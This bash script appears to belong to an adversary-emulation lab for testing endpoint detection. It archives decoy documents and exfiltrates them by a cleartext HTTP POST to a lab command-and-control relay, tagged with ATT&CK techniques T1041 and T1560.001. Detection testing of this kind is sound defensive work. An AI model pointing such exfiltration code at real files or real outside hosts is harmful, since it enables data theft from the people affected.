#!/bin/bash
#
# run-http-exfil.sh
# ---------------------------------------------------------------------------
# EDR DETECTION COVERAGE — NON-PRODUCTION USE ONLY
#
# Complements run-metadata-exfil.sh's DNS-tunnel exfil with a second, more
# common channel: one large plain-HTTP POST of a staged archive to the C2 relay
# (services/control_api.py /exfil on port 8443). The traffic is cleartext, so a
# network sensor can read it; run-https-exfil.sh sends the same kind of archive
# over TLS. Uses the archive from run-collection-staging.sh if there is one,
# otherwise stages decoy documents itself.
#
#   POST staged archive to the C2 over HTTP     Exfiltration Over C2 Channel   (T1041)
# ---------------------------------------------------------------------------
set -u
source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"

HOME_DIR="${HOME:-/home/root}"
DECOY_DIR="${DECOY_DIR:-${HOME_DIR}/decoy-data}"
RESULTS_DIR="${RESULTS_DIR:-${HOME_DIR}/results}"
C2_HOST="${C2_HOST:-control-api}"
C2_PORT="${C2_PORT:-8443}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/httpexfil_${SESSION}.log"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "Cymylau :: HTTP exfil emulation (cleartext) :: session=$SESSION"

ARCHIVE="$(find "$RESULTS_DIR" -maxdepth 1 -name 'staged_*.tar.gz' | sort | tail -n1)"
if [ -z "${ARCHIVE:-}" ]; then
    say "no staged archive found — staging decoy documents now"
    mkdir -p "${DECOY_DIR}/documents"
    [ -z "$(ls -A "${DECOY_DIR}/documents" 2>/dev/null)" ] && bash "$(dirname "$0")/seed-decoys.sh"
    ARCHIVE="${RESULTS_DIR}/httpexfil_payload_${SESSION}.tar.gz"
    st_mark T1560.001 "stage-for-exfil"
    ax T1560.001 "$LAB_NODE" "$ARCHIVE" -- tar -czf "$ARCHIVE" -C "$DECOY_DIR" documents 2>&1 | tee -a "$LOG"
fi
say "using archive: $ARCHIVE ($(wc -c < "$ARCHIVE" 2>/dev/null || echo 0) bytes)"

step "exfiltrate the archive with a plain-HTTP POST to the C2 relay (ATT&CK T1041)"
st_mark T1041 "http-exfil"
RESP="$(ST_HTTP_TIMEOUT=10 st_http POST "http://${C2_HOST}:${C2_PORT}/exfil" "@${ARCHIVE}" "Content-Type: application/octet-stream")"
say "C2 response: $RESP"

step "Done — HTTP exfil complete."
say "artifacts: $LOG  (received copy under results/c2_exfil_received/ on the control-api side)"

act_summary
